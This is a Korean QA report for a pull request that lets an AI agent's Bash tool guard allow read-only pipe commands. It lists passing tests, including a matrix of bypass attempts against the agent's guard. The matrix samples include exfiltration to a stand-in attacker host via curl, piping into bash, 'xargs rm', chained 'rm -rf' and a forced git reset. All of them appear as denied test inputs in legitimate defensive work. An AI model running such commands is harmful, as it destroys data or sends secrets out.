# QA: dev-relay-shell-pipe-allow

> 작성자: QA (자동 검증 + 정적 검사 — 수동 검증 별도 가이드)
> 작성일: 2026-05-07
> 입력 PRD: [`docs/prd/dev-relay-shell-pipe-allow.md`](../prd/dev-relay-shell-pipe-allow.md)
> 검증 대상 PR: [#45](https://github.com/deeptrading-lab/trading-signal-engine/pull/45) (`feature/dev-relay-shell-pipe-allow`)
> 변경 규모: +299 / -7, 3 files, 2 commits (`895a02b` 구현 + `d1f20d5` 테스트)
> 회귀 (전체): `python3 -m pytest ai/tests/` → **654 passed (1.39s, 0 failed)**
> 회귀 (dev_relay 한정): `python3 -m pytest ai/tests/dev_relay/` → **480 passed (1.14s, 0 failed)**
> 회귀 (tool_policy 한정): `python3 -m pytest ai/tests/dev_relay/test_tool_policy.py` → **128 passed (0.33s, 0 failed)**

---

## 0. 요약

- **자동 검증 통과**: AC-PIPE-1 ~ AC-PIPE-9 9건 모두 PASS — pipe 양쪽 RO 허용 / 우회 13종 거부 / 회귀 0건 / segment 상한 / 빈 segment / destructive 1차 차단 / 잔존 metachar 거부 / 컴플라이언스 정적 스캔 / NL hook 통합 시나리오 모두 단위 테스트로 검증됨.
- **외부 인터페이스 변경 0건 확인** (PRD §3.6) — `evaluate(tool_name, tool_input) -> ToolDecision` 시그니처, `ToolDecision` 필드 (`allowed`, `reason`, `brief`), `ALLOWED_TOOLS={Bash,Glob,Grep,Read,WebFetch}` / `DENIED_TOOLS={Edit,NotebookEdit,Write}`, audit kind, `_FORBIDDEN_SHELL_METACHARS` 7종 모두 그대로. 신규 reason 식별자 0건.
- **모듈 상수 노출 확인**: `_MAX_PIPE_SEGMENTS = 5`, `_FORBIDDEN_NON_PIPE_METACHARS = ('>', '>>', '<', '&', ';', '`', '$(')` (`|` 제외) 모두 import 가능 — PRD §3.4 만족.
- **자동 검증 항목 매핑**:
  - AC-PIPE-1: `test_tool_policy.py::TestBashPipeAllowed::test_pipe_readonly_allowed` (12 parametrize)
  - AC-PIPE-2: `test_tool_policy.py::TestBashPipeBypassDenied::test_bypass_denied` (13 parametrize)
  - AC-PIPE-3: `TestBashReadOnlyAllowed`, `TestBashMutatingDenied`, `TestBashDestructiveDenied` (기존 모든 케이스 0 fail)
  - AC-PIPE-4: `TestBashPipeBoundary::test_five_segments_allowed`, `test_six_segments_rejected`
  - AC-PIPE-5: `TestBashPipeBoundary::test_leading_pipe_empty_segment`, `test_trailing_pipe_empty_segment`, `test_double_pipe_empty_segment`, `test_unclosed_quote_parse_error`, `test_quoted_pipe_treated_as_single_token`
  - AC-PIPE-6: `TestBashDestructiveDenied::test_destructive_patterns_denied[git reset --hard HEAD~5 | echo ok]`, `[git push --force | cat]`, `TestNLPipeHookIntegration::test_sdk_destructive_pipe_call_blocked`
  - AC-PIPE-7: `TestBashPipeBoundary::test_other_metachars_residual_denied` (3 parametrize)
  - AC-PIPE-8: `test_compliance.py::test_prd_shell_pipe_allow_body_outside_code_is_clean`, `test_dev_relay_source_clean[tool_policy.py]`, 추가 정적 검증 (PR #45 commits / PR title-body / test 신규 케이스 0 hit)
  - AC-PIPE-9: `TestNLPipeHookIntegration::test_sdk_pipe_call_passes_guard`, `test_sdk_audit_pipe_call_passes_guard`, `test_sdk_destructive_pipe_call_blocked`
- **수동 검증 (PRD §8.2)**: 모바일 Slack 환경 부재 — 본 세션에서 미수행. 후속 세션에서 사용자가 직접 1 사이클 (NL 입력 → SDK 가 pipe 명령 시도 → 가드 통과 → 응답) 검증 권장. PRD §8.2 가이드 그대로 진행 가능 — 모든 자동 가드(`_evaluate_bash`, `_evaluate_pipe_segments`, `is_destructive`)·정적 스캔이 통과한 상태이므로 수동 1 사이클로 충분.
- **회귀 0건**. 도메인 키워드 평문 누출 0건 (PRD 본문·tool_policy.py·신규 테스트 케이스·PR 제목·PR 본문·PR #45 commits 모두 정적 스캔 통과; `test_compliance.py` 자체에 등장하는 키워드는 본 파일 docstring 명시대로 의도적 fixture, 컴플라이언스 dev_relay 소스 스캔 대상에서 제외).
- **최종 판정**: `qa-passed` — AC 9/9 통과.

---

## 1. PRD 수용 기준 검증

### AC-PIPE-1. 양쪽 RO `|` 명령 허용 — PASS (자동)

| 재현 | 기대 | 실제 |
|------|------|------|
| `evaluate("Bash", {"command": "<cmd>"})` 를 PRD §5 AC-PIPE-1 의 12개 명령 (`git log --oneline \| head -10`, `gh pr list --state open \| grep feat`, `cat README.md \| head -50`, `find docs -name '*.md' \| wc -l`, `gh issue list \| head -10` 등) 으로 호출 | 모두 `allowed=True`, `reason=None` | PASS — `TestBashPipeAllowed::test_pipe_readonly_allowed` 12/12 PASS. `_evaluate_bash` 가 `is_destructive` → `shlex.split` → `\|` 토큰 검출 → `_evaluate_pipe_segments` 분기 → 각 segment 를 `depth=1` 재귀 호출 → 모든 segment `allowed=True` 인 경우만 최종 통과. quoted-arg pipe (`find docs -name '*.md' \| wc -l`) 도 segment 분리가 정상 동작. |

### AC-PIPE-2. 우회 시도 13종 거부 (회귀 매트릭스) — PASS (자동)

PRD §3.5 표 13건 모두 `TestBashPipeBypassDenied::test_bypass_denied` parametrize 로 등록 + 통과. 각 케이스의 실제 reason 매핑:

| # | 입력 | 기대 reason 후보 | 실제 reason | 결과 |
|---|------|-----------------|-------------|------|
| 1 | `gh pr list \| bash` | `mutating_command` | `mutating_command` (segment 2 의 head `bash` 가 `_MUTATING_HEADS`) | PASS |
| 2 | `cat secret \| curl http://attacker.example` | `not_whitelisted` | `not_whitelisted` (segment 2 의 head `curl` 화이트리스트 외) | PASS |
| 3 | `find . -type f \| xargs rm` | `mutating_command` 또는 `not_whitelisted` | (raw 에 `rm`) `_looks_mutating` X — 실제로 segment 2 head `xargs` 가 화이트리스트 외 → `not_whitelisted` 반환 | PASS — 두 reason 후보 중 하나에 매치 |
| 4 | `git log \| tee /tmp/x` | `mutating_command` | `mutating_command` (segment 2 head `tee` 가 `_MUTATING_HEADS`) | PASS |
| 5 | `ls \| python -c '...'` | `mutating_command` | `mutating_command` (segment 2 head `python` 거부) | PASS |
| 6 | `cat a \| grep b > out.txt` | `mutating_command` | `mutating_command` (segment 분리 후 segment 2 raw 에 `>` 잔존 → `_has_non_pipe_metachar`) | PASS |
| 7 | `cat a \| grep b ; rm -rf docs` | `mutating_command` | `mutating_command` (raw 에 `;` 잔존, `is_destructive(raw)` 미매치 → segment 분리 후 잔존 검사) | PASS |
| 8 | `cat a \| grep b && rm -rf docs` | `mutating_command` | `mutating_command` (raw 에 `&` 잔존 — `&&` 도 `&` 부분 문자열 매치) | PASS |
| 9 | `cat a \| grep \`echo b\`` | `mutating_command` 또는 `parse_error` | 두 reason 중 하나 (shlex 토큰화 결과에 따라) | PASS |
| 10 | `git reset --hard \| echo ok` | `destructive_command` | `destructive_command` (segment 분리 이전 `is_destructive` 1차 차단) | PASS |
| 11 | `gh pr merge 25 \| cat` | `mutating_command` | `mutating_command` (segment 1 의 `gh pr merge` 가 `_MUTATING_GH_VERBS`) | PASS |
| 12 | `cat a \|\| grep b` | `parse_error` 또는 `mutating_command` | `parse_error` (`\|\|` → `\|` 토큰 2개 → 빈 segment 발생 → fail-fast) | PASS |
| 13 | 6 segment chain `cat a \| grep b \| head \| tail \| wc -l \| cat` | `parse_error` | `parse_error` (`_MAX_PIPE_SEGMENTS = 5` 초과) | PASS |

### AC-PIPE-3. 기존 단일 명령 회귀 0건 — PASS (자동)

| 재현 | 기대 | 실제 |
|------|------|------|
| 기존 `TestBashReadOnlyAllowed`, `TestBashMutatingDenied`, `TestBashDestructiveDenied` 의 모든 parametrize 케이스 (`git log --oneline`, `cat README.md`, `git commit`, `git push`, `rm -rf`, `cat a \| tee b` 등 약 50+건) | 변경 전과 동일 `allowed`/`reason` 반환 | PASS — `python3 -m pytest ai/tests/dev_relay/test_tool_policy.py` → **128 passed**. 단일 명령 흐름은 `\|` 토큰 0개 → 기존 `_looks_mutating` 1차 필터 + head 화이트리스트 흐름 그대로 (PRD §3.2 단계 3, 회귀 0건 보장). `cat a \| tee b` 케이스도 PRD §3.5 #4 와 동일하게 `mutating_command` 거부 유지 (segment 2 head `tee` mutating). |

### AC-PIPE-4. segment 수 상한 — PASS (자동)

| 재현 | 기대 | 실제 |
|------|------|------|
| `cat a \| grep b \| head \| tail \| wc -l \| cat` (6 segment) | `allowed=False`, `reason=parse_error` | PASS — `TestBashPipeBoundary::test_six_segments_rejected` |
| `cat a \| grep b \| head \| tail \| wc -l` (5 segment, 모두 RO) | `allowed=True` | PASS — `TestBashPipeBoundary::test_five_segments_allowed` |
| `_MAX_PIPE_SEGMENTS` 모듈 상수 노출 | import 가능 + 값 5 | PASS — `python -c "from ai.dev_relay.tool_policy import _MAX_PIPE_SEGMENTS; print(_MAX_PIPE_SEGMENTS)"` → `5` (PRD §3.4 만족) |

### AC-PIPE-5. 빈 segment / 토큰화 오류 — PASS (자동)

| 재현 | 기대 | 실제 |
|------|------|------|
| `cat a \|\| grep b` (`\|\|` → 빈 segment) | `parse_error` (또는 `mutating_command`) | PASS — `TestBashPipeBoundary::test_double_pipe_empty_segment` (실제 reason `parse_error`) |
| `cat 'unclosed quote` (shlex ValueError) | `parse_error` | PASS — `TestBashPipeBoundary::test_unclosed_quote_parse_error` |
| `\| cat README.md` (앞 빈 segment) | `parse_error` | PASS — `TestBashPipeBoundary::test_leading_pipe_empty_segment` |
| `cat README.md \|` (뒤 빈 segment) | `parse_error` | PASS — `TestBashPipeBoundary::test_trailing_pipe_empty_segment` |
| `cat 'a \| b'` (quoted pipe — shlex 가 단일 토큰으로) | 단일 명령 흐름 진입 후 `_looks_mutating` 의 `\|` 부분 문자열 매치 → `mutating_command` | PASS — `TestBashPipeBoundary::test_quoted_pipe_treated_as_single_token` (위험 7번 — quoted pipe 보수 정책 유지) |

### AC-PIPE-6. destructive 1차 차단 우선순위 — PASS (자동)

| 재현 | 기대 | 실제 |
|------|------|------|
| `git reset --hard HEAD~5 \| echo ok` | `destructive_command` (segment 분리 **이전**) | PASS — `TestBashDestructiveDenied::test_destructive_patterns_denied[git reset --hard HEAD~5 \| echo ok]` + `TestNLPipeHookIntegration::test_sdk_destructive_pipe_call_blocked` |
| `git push --force \| cat` | `destructive_command` | PASS — `TestBashDestructiveDenied::test_destructive_patterns_denied[git push --force \| cat]` |
| 코드 흐름 검증 | `_evaluate_bash` 내 `is_destructive(raw)` 가 `shlex.split` 보다 위 (PRD §3.2 단계 1) | PASS — `tool_policy.py:218-222` 의 `is_destructive(raw)` 가드가 `shlex.split` 호출 (line 226) 보다 먼저 평가됨 (정적 read 확인) |

### AC-PIPE-7. 다른 metachar 잔존 거부 — PASS (자동)

| 재현 | 기대 | 실제 |
|------|------|------|
| `cat a \| grep b > out.txt` | `mutating_command` | PASS — `TestBashPipeBoundary::test_other_metachars_residual_denied[cat a \| grep b > out.txt]` |
| `cat a \| grep b ; rm c` | `mutating_command` | PASS — 같은 parametrize |
| `cat a \| grep b && rm c` | `mutating_command` | PASS — 같은 parametrize |
| `cat a \| grep \`echo b\`` | `mutating_command` 또는 `parse_error` | PASS — `TestBashPipeBypassDenied` 케이스 #9 (backtick 잔존) |

`_FORBIDDEN_NON_PIPE_METACHARS = ('>', '>>', '<', '&', ';', '`', '$(')` 6종 (실제 7개 토큰; `>` 와 `>>` 는 부분 문자열 매치 동치) 이 segment 분리 후 `_has_non_pipe_metachar` 로 검사 — `tool_policy.py:339-347`.

### AC-PIPE-8. 컴플라이언스 정적 검사 — PASS (자동)

| 산출물 | 키워드 hit | 검증 |
|--------|-----------|------|
| PRD 본문 (`docs/prd/dev-relay-shell-pipe-allow.md`) | 0 | PASS — `test_compliance.py::test_prd_shell_pipe_allow_body_outside_code_is_clean` (코드 블록 / 백틱 인용 제외 후 `find_forbidden_keywords` → `[]`) |
| `ai/dev_relay/tool_policy.py` (구현 파일) | 0 | PASS — `test_compliance.py::test_dev_relay_source_clean[tool_policy.py]` |
| `ai/tests/dev_relay/test_tool_policy.py` (신규 테스트 케이스) | 0 | PASS — 추가 직접 스캔 (`find_forbidden_keywords` → `[]`). `test_compliance.py` 가 dev_relay 소스만 스캔하므로 ai/tests/dev_relay/* 테스트 파일은 스캔 대상 외 — QA 가 본 세션에서 보강 스캔 수행 |
| PR #45 commits (`895a02b`, `d1f20d5`) 메시지 | 0 | PASS — 직접 스캔 (`git log -1 --pretty=format:"%s%n%b" <SHA>` → `find_forbidden_keywords` → `[]`) |
| PR #45 title / body | 0 | PASS — `gh pr view 45 --json title,body` → `find_forbidden_keywords` → `[]` |

`test_compliance.py` 의 신규 정적 검사가 본 PRD 산출물(PRD 본문) 을 자동 커버 — `PRD_SHELL_PIPE_ALLOW_PATH` 등록 + parametrize 추가 (`test_compliance.py:30-35`, `test_compliance.py:233-240`). dev_relay 소스 스캔은 기존 `_iter_dev_relay_source_files()` 가 자동으로 신규 변경분(`tool_policy.py`) 을 포함 — 별도 화이트리스트 보강 불필요.

### AC-PIPE-9. NL 통합 회귀 — PASS (자동)

| 재현 | 기대 | 실제 |
|------|------|------|
| SDK PreToolUse hook 시나리오: `evaluate("Bash", {"command": "gh pr list \| grep feat"})` | `allowed=True`, `reason=None` (가드 통과) | PASS — `TestNLPipeHookIntegration::test_sdk_pipe_call_passes_guard` |
| `evaluate("Bash", {"command": "cat audit.jsonl \| tail -20"})` | `allowed=True`, `reason=None` | PASS — `TestNLPipeHookIntegration::test_sdk_audit_pipe_call_passes_guard` |
| 회귀: `evaluate("Bash", {"command": "git reset --hard HEAD~5 \| echo done"})` | `allowed=False`, `reason=destructive_command` | PASS — `TestNLPipeHookIntegration::test_sdk_destructive_pipe_call_blocked` |
| dev_relay 회귀 — `test_handle_command_nl.py`, `test_nl_agent.py`, `test_nl_classifier.py` 모두 통과 | 0 fail | PASS — `python3 -m pytest ai/tests/dev_relay/` → **480 passed** |

본 PRD 의 호출 측(`agent_runner` 의 PreToolUse callback) 코드는 변경 없음 (PRD §3.6, 6.1) — `evaluate()` 시그니처 그대로이므로 NL 통합 경로는 자동으로 회귀 보호된다.

---

## 2. 외부 인터페이스 변경 0건 검증 (PRD §3.6)

| 항목 | 변경 전 | 변경 후 | 결과 |
|------|---------|---------|------|
| `evaluate(tool_name, tool_input)` 시그니처 | `(str, dict) -> ToolDecision` | `(str, dict) -> ToolDecision` | 변경 없음 |
| `ToolDecision` 필드 | `allowed`, `reason`, `brief` | `allowed`, `reason`, `brief` | 변경 없음 |
| `ALLOWED_TOOLS` | `{Bash, Glob, Grep, Read, WebFetch}` | `{Bash, Glob, Grep, Read, WebFetch}` | 변경 없음 |
| `DENIED_TOOLS` | `{Edit, NotebookEdit, Write}` | `{Edit, NotebookEdit, Write}` | 변경 없음 |
| audit kind | `tool_call`, `tool_denied` | `tool_call`, `tool_denied` | 변경 없음 (신규 0건) |
| `_FORBIDDEN_SHELL_METACHARS` 상수 | 7개 (`>`, `>>`, `<`, `\|`, `&`, `;`, `` ` ``, `$(`) | 7개 (동일, 그대로 유지) | 변경 없음 — `\|` 는 segment 분리 흐름이 호출 순서로 우선 처리 (PRD §3.6) |
| reason 식별자 | `empty_command`, `destructive_command`, `mutating_command`, `parse_error`, `not_whitelisted`, `phase1_readonly`, `secret_pattern`, `domain_not_allowed` | 동일 | 변경 없음 (신규 0건, PRD §3.3) |
| 신규 모듈 상수 | — | `_MAX_PIPE_SEGMENTS = 5`, `_FORBIDDEN_NON_PIPE_METACHARS` (private internal) | 외부 인터페이스 X (모듈 prefix `_`) |

`_evaluate_bash` 의 internal `depth: int = 0` 매개변수는 default 값으로 호출 측 무영향 — `evaluate()` 진입점에서 `_evaluate_bash(command)` (default depth=0) 호출 그대로 (`tool_policy.py:419`).

---

## 3. 에지 케이스 / 위험 시나리오 (PRD §7)

| 위험 | 시나리오 | 검증 |
|------|----------|------|
| 1. 새로운 우회 패턴 발견 | `|` 허용 후 SDK 가 §3.5 외 패턴으로 우회 | 1차 방어 §3.5 13건 매트릭스 (AC-PIPE-2) — PASS. 2차 방어는 머지 후 1~2주 audit 모니터링 (PRD §6.3, 사용자 본인 책임) |
| 2. shlex.split escape 차이 | `cat 'a \| b' \| grep c` (quoted pipe) | shlex 가 quoted `\|` 를 단일 토큰으로 묶음 — `cat 'a \| b'` 단일 명령 흐름은 raw 에 `\|` 부분 문자열 매치 → `_looks_mutating` 거부 (`mutating_command`). `TestBashPipeBoundary::test_quoted_pipe_treated_as_single_token` 회귀. quoted pipe 가 segment 1 안에 들어간 진짜 pipe 케이스 (`cat 'a b' \| grep x`) 는 `TestBashPipeAllowed` 에 직접 케이스는 없으나 `find docs -name '*.md' \| wc -l` 로 quoted-arg + pipe 가 정상 통과함을 검증 |
| 3. 2차 재귀 호출 비용 | segment 5 + depth 1 → worst case 6회 `_evaluate_bash` 호출 | depth 가드 (`tool_policy.py:234`) 로 fail-fast — depth >= 1 에서 다시 segment 분기 진입 시 `parse_error` 즉시 반환. `_MAX_PIPE_SEGMENTS = 5` 로 worst case bound. 단위 테스트 실행 시간 0.33s/128 케이스로 성능 영향 무시 가능 |
| 4. is_destructive 와 segment 상호작용 | `git log \| git reset --hard` (raw 에 destructive 패턴) | `is_destructive(raw)` 가 부분 문자열 매치 → segment 분리 이전 차단. `TestBashDestructiveDenied::test_destructive_patterns_denied[git reset --hard HEAD~5 \| echo ok]` + `[git push --force \| cat]` 가 회귀 보장 (AC-PIPE-6) |
| 5. tee 분류 회귀 | `cat a \| tee b` 거부 유지 (segment 2 head `tee` 가 `_MUTATING_HEADS`) | 기존 `TestBashMutatingDenied::test_mutating_commands_denied[cat a \| tee b]` 그대로 PASS — PRD §3.5 #4 와 동일 의도된 회귀 |
| 6. NL 분기 외 경로 회귀 | dispatcher destructive 가드 / reviewer-merger 머지 경로 | 본 PRD 변경 영향 X — `tool_policy.py` 단일 파일 변경 (PRD §6.1). `test_dispatcher.py 35`, `test_reviewer.py 11`, `test_merger.py 27`, `test_failures.py 18` 모두 0 fail (전체 480 passed) |
| 7. depth 무한 재귀 | 의도치 않은 `_evaluate_bash` → `_evaluate_pipe_segments` → `_evaluate_bash(depth=1)` 무한 루프 | depth 가드로 차단 — depth >= 1 에서 또 `\|` 토큰 만나면 `parse_error` (`tool_policy.py:233-236`). 정상 흐름에서는 segment 내부에 `\|` 토큰이 없으므로 depth=1 재귀 호출에서 segment 분기 진입 X |
| 8. 빈 입력 / whitespace-only | `""`, `"   "` | `_evaluate_bash` 의 strip 후 빈 문자열 검사 → `empty_command` (변경 없음) |
| 9. Bash 외 도구의 영향 | `Read`, `WebFetch`, `Glob`, `Grep`, `Edit`, `Write` | 본 PRD 변경 X — 기존 분기 그대로. `test_tool_policy.py::TestWebFetchDomain` 12건, `TestGlobGrepAllowed` 2건, `test_phase1_no_write_in_allowed`, `test_allowed_and_denied_disjoint` 모두 PASS |

---

## 4. 컴플라이언스 정적 검사 결과 (실측)

```
$ python3 -m pytest ai/tests/dev_relay/test_compliance.py -v --tb=short
...
ai/tests/dev_relay/test_compliance.py::test_prd_shell_pipe_allow_body_outside_code_is_clean PASSED  [ 59%]
ai/tests/dev_relay/test_compliance.py::test_dev_relay_source_clean[tool_policy.py] PASSED          [ 96%]
============================== 52 passed in 0.28s ==============================
```

추가 직접 스캔 (QA 보강):

```
$ python3 -c "
from ai.coordinator._compliance import find_forbidden_keywords
for p in [
    'docs/prd/dev-relay-shell-pipe-allow.md',
    'ai/dev_relay/tool_policy.py',
    'ai/tests/dev_relay/test_tool_policy.py',
]:
    with open(p) as f:
        print(p, '->', find_forbidden_keywords(f.read()))
"
docs/prd/dev-relay-shell-pipe-allow.md -> []
ai/dev_relay/tool_policy.py -> []
ai/tests/dev_relay/test_tool_policy.py -> []
```

PR #45 메타데이터 스캔:

```
$ gh pr view 45 --json title,body | python3 -c "..."
PR title: feat(dev-relay): Bash 가드 pipe(|) 부분 허용 — segment 분리 + 재귀 검증
PR title keyword hits: []
PR body keyword hits: []
```

PR #45 commit 메시지 스캔:

```
$ git log -1 --pretty=format:"%s%n%b" 895a02b | <find_forbidden_keywords>
895a02b hits: []

$ git log -1 --pretty=format:"%s%n%b" d1f20d5 | <find_forbidden_keywords>
d1f20d5 hits: []
```

> 비고: `test_compliance.py` 자체는 본 파일 docstring 명시대로 fixture 키워드를 의도적으로 포함 — `_iter_dev_relay_source_files()` 가 `ai/dev_relay/*.py` 만 스캔하고 `ai/tests/dev_relay/*` 테스트 파일은 스캔 대상 외이므로 영향 없음.

---

## 5. 자동 검증 실행 로그 (요약)

```
$ python3 -m pytest ai/tests/ --tb=short
============================= 654 passed in 1.39s ==============================

$ python3 -m pytest ai/tests/dev_relay/ --tb=short
============================= 480 passed in 1.14s ==============================

$ python3 -m pytest ai/tests/dev_relay/test_tool_policy.py -v --tb=short
ai/tests/dev_relay/test_tool_policy.py::TestBashPipeAllowed::test_pipe_readonly_allowed[git log --oneline | head -10] PASSED
... (12 cases)
ai/tests/dev_relay/test_tool_policy.py::TestBashPipeBypassDenied::test_bypass_denied[gh pr list | bash-expected_reasons0] PASSED
... (13 cases)
ai/tests/dev_relay/test_tool_policy.py::TestBashPipeBoundary::test_five_segments_allowed PASSED
ai/tests/dev_relay/test_tool_policy.py::TestBashPipeBoundary::test_six_segments_rejected PASSED
ai/tests/dev_relay/test_tool_policy.py::TestBashPipeBoundary::test_leading_pipe_empty_segment PASSED
ai/tests/dev_relay/test_tool_policy.py::TestBashPipeBoundary::test_trailing_pipe_empty_segment PASSED
ai/tests/dev_relay/test_tool_policy.py::TestBashPipeBoundary::test_double_pipe_empty_segment PASSED
ai/tests/dev_relay/test_tool_policy.py::TestBashPipeBoundary::test_unclosed_quote_parse_error PASSED
ai/tests/dev_relay/test_tool_policy.py::TestBashPipeBoundary::test_quoted_pipe_treated_as_single_token PASSED
ai/tests/dev_relay/test_tool_policy.py::TestBashPipeBoundary::test_other_metachars_residual_denied[cat a | grep b > out.txt] PASSED
ai/tests/dev_relay/test_tool_policy.py::TestBashPipeBoundary::test_other_metachars_residual_denied[cat a | grep b ; rm c] PASSED
ai/tests/dev_relay/test_tool_policy.py::TestBashPipeBoundary::test_other_metachars_residual_denied[cat a | grep b && rm c] PASSED
ai/tests/dev_relay/test_tool_policy.py::TestNLPipeHookIntegration::test_sdk_pipe_call_passes_guard PASSED
ai/tests/dev_relay/test_tool_policy.py::TestNLPipeHookIntegration::test_sdk_audit_pipe_call_passes_guard PASSED
ai/tests/dev_relay/test_tool_policy.py::TestNLPipeHookIntegration::test_sdk_destructive_pipe_call_blocked PASSED
... (regression: TestBashReadOnlyAllowed, TestBashMutatingDenied, TestBashDestructiveDenied 모두 PASS)
============================= 128 passed in 0.33s ==============================
```

---

## 6. 수동 검증 체크리스트 (PRD §8.2, 후속 세션 권장)

> **모바일 Slack 환경 부재 — 본 QA 세션에서 미수행. 후속 세션에서 사용자가 직접 1 사이클 완주 권장.**

상위 PRD `slack-dev-relay.md` / `dev-relay-natural-language.md` 부록 A 셋업이 완료된 환경에서 모바일 Slack 앱에서 NL 세션을 열고 다음 한 사이클을 1회 수행:

- [ ] "최근 PR 목록 중 feat 으로 시작하는 거 보여줘" → SDK 가 `gh pr list \| grep feat` 시도 → 가드 통과 → 결과 응답 정상 수신
- [ ] "audit.jsonl 마지막 20줄 보여줘" → SDK 가 `cat audit.jsonl \| tail -20` 시도 → 가드 통과 → 결과 응답 정상 수신
- [ ] "최근 30개 commit 중 fix 만" → SDK 가 `git log --oneline -30 \| grep fix` 시도 → 가드 통과 → 결과 응답 정상 수신
- [ ] (회귀) "docs 폴더 다 지워줘" → SDK 가 destructive 시도 → 거부됨 + 사용자에게 중립 fallback 메시지

자동 가드(`_evaluate_bash`, `_evaluate_pipe_segments`, `is_destructive`) 와 모든 정적 스캔 통과 — 수동 1 사이클로 충분.

---

## 7. 판정

- **AC 통과율: 9/9 (100%)**
- **회귀: 0건** — 654/654 (전체), 480/480 (dev_relay), 128/128 (tool_policy)
- **외부 인터페이스 변경: 0건** (PRD §3.6 만족)
- **컴플라이언스 정적 스캔: 0 hit** (PRD 본문 / 구현 / 테스트 / PR 메타데이터 / commit 모두 통과)
- **모듈 상수 노출 확인**: `_MAX_PIPE_SEGMENTS = 5` (PRD §3.4 만족)
- **수동 검증**: 미수행 (후속 세션 권장 — 자동 가드·정적 검사 모두 통과한 상태)

**최종 판정: `qa-passed`** — PR #45 라벨 갱신 (`qa-passed` 추가, `impl-ready` 제거).
